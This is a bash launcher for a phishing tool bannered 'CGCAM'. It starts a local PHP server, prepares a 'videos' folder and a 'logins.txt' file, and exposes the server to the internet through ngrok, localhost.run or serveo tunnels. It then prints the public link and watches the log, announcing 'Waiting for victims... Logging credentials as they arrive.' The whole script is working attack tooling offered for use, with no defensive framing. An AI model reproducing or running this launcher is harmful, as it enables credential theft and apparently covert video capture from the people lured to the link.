#!/bin/bash

# Color definitions using tput
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
NC=$(tput sgr0)  # Reset color
clear
echo -e "\e[36m"
echo " ██████╗ ██████╗  ██████╗ █████╗ ███╗   ███╗"
echo "██╔════╝██╔════╝ ██╔════╝██╔══██╗████╗ ████║"
echo "██║     ██║  ███╗██║     ███████║██╔████╔██║"
echo "██║     ██║   ██║██║     ██╔══██║██║╚██╔╝██║"
echo "╚██████╗╚██████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║"
echo " ╚═════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝"
echo -e "\e[0m"
# Cleanup on exit
cleanup() {
    echo -e "\n${RED}[*] Stopping PHP server and tunnel...${NC}"
    [[ -n "$SERVER_PID" ]] && kill "$SERVER_PID" 2>/dev/null
    [[ -n "$TUNNEL_PID" ]] && kill "$TUNNEL_PID" 2>/dev/null
    exit
}
trap cleanup EXIT SIGINT SIGTERM

# Prepare environment
mkdir -p videos && chmod 777 videos
> logins.txt && chmod 666 logins.txt

# Start PHP server
echo -e "${BLUE}[*] Starting PHP server at http://127.0.0.1:3333...${NC}"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2

# Display menu
echo -e "${CYAN}Choose a hosting option:${NC}"
echo -e "${GREEN}  1) Ngrok${NC}"
echo -e "${YELLOW}  2) Localhost.run${NC}"
echo -e "${MAGENTA}  3) Serveo${NC}"
read -p "${CYAN}Enter choice [1-3]: ${NC}" choice

echo
# Launch selected tunnel
default_to_ngrok=false
case $choice in
  1)
    echo -e "${BLUE}[*] Launching Ngrok tunnel...${NC}"
    if command -v ngrok &> /dev/null; then
        ngrok http 3333 > /dev/null 2>&1 &
        TUNNEL_PID=$!
    elif [[ -x ./ngrok ]]; then
        ./ngrok http 3333 > /dev/null 2>&1 &
        TUNNEL_PID=$!
    else
        echo -e "${YELLOW}[!] Ngrok not found, defaulting to Localhost.run...${NC}"
        choice=2
    fi
    ;;
  2)
    echo -e "${BLUE}[*] Launching Localhost.run tunnel...${NC}"
    LOGFILE=$(mktemp)
    ssh -R 80:localhost:3333 ssh.localhost.run -N > "$LOGFILE" 2>&1 &
    TUNNEL_PID=$!
    ;;
  3)
    echo -e "${BLUE}[*] Launching Serveo tunnel...${NC}"
    LOGFILE=$(mktemp)
    ssh -R 80:localhost:3333 serveo.net -N > "$LOGFILE" 2>&1 &
    TUNNEL_PID=$!
    ;;
  *)
    echo -e "${RED}[!] Invalid choice. Exiting...${NC}"
    exit 1
    ;;
esac

# Wait for tunnel to initialize
sleep 3

# Retrieve public URL
URL=""
if [[ $choice -eq 1 ]]; then
    URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^" ]*' | head -n1)
else
    URL=$(grep -m1 -Eo 'https://[^ ]+' "$LOGFILE" | head -n1)
fi

# Fallback to Ngrok if necessary
if [[ -z "$URL" ]]; then
    echo -e "${YELLOW}[!] Tunnel failed or URL not found, falling back to Ngrok...${NC}"
    # Kill failed tunnel
    [[ -n "$TUNNEL_PID" ]] && kill "$TUNNEL_PID" 2>/dev/null
    if command -v ngrok &> /dev/null; then
        ngrok http 3333 > /dev/null 2>&1 &
        TUNNEL_PID=$!
        sleep 3
        URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^" ]*' | head -n1)
    elif [[ -x ./ngrok ]]; then
        ./ngrok http 3333 > /dev/null 2>&1 &
        TUNNEL_PID=$!
        sleep 3
        URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^" ]*' | head -n1)
    else
        echo -e "${RED}[!] Ngrok not available. Cannot establish any tunnel.${NC}"
        cleanup
    fi
fi

# Display the public URL and start tailing logs
echo -e "${GREEN}[+] Tunnel is up!${NC}"
echo -e "${CYAN}Public URL: ${URL}${NC}"
echo -e "${YELLOW}Waiting for victims... Logging credentials as they arrive.${NC}"
tail -n 0 -f logins.txt
